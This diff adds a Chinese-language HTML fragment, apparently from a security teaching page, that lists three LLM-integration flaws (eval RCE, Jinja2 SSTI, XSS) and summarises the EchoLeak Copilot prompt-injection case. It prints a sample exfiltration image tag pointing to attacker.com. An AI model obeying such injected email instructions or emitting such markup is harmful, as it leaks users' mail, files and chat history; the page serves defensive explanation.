@@ -1,0 +1,34 @@
+<div class="card shadow-sm mb-3">
+    <div class="card-header"><strong>三种典型缺陷与攻击方式</strong></div>
+    <div class="card-body">
+        <table class="table table-sm table-bordered mb-0 small">
+            <thead>
+                <tr>
+                    <th>功能场景</th>
+                    <th>攻击方式与后果</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>后端用 eval 解析 LLM 生成的 JSON</td>
+                    <td>Prompt Injection → LLM 输出恶意 Python 代码 → eval() 执行 → RCE</td>
+                </tr>
+                <tr>
+                    <td>Prompt 模板用 Jinja2 渲染用户可控内容</td>
+                    <td>注入 System Prompt → SSTI → 文件读取 / 代码执行</td>
+                </tr>
+                <tr>
+                    <td>前端直接渲染 LLM 输出的 HTML/Markdown</td>
+                    <td>Prompt Injection → LLM 输出 &lt;script&gt;/&lt;img&gt; 等 → XSS → 窃取聊天记录、Cookie</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+<div class="card shadow-sm mb-3">
+    <div class="card-header"><strong>典型案例：Microsoft 365 Copilot EchoLeak（CVE-2025-32711）</strong></div>
+    <div class="card-body small">
+        <p class="mb-2">零点击（zero-click）漏洞：攻击者在邮件中藏入间接 Prompt Injection，用户或 Copilot 自动处理该邮件时，LLM 被注入指令，从用户上下文（邮件、OneDrive、聊天历史等）提取敏感数据，并输出带 <code>&lt;img src="https://attacker.com/exfil?data=base64..."&gt;</code> 的 Markdown；前端渲染时自动请求攻击者服务器，数据被外带。</p>
+        <p class="mb-0 text-muted">共性根源：LLM 输出未视为「不可信内容」；RAG 上下文边界模糊；自动工具调用/渲染放大攻击面。</p>
+    </div>
+</div>
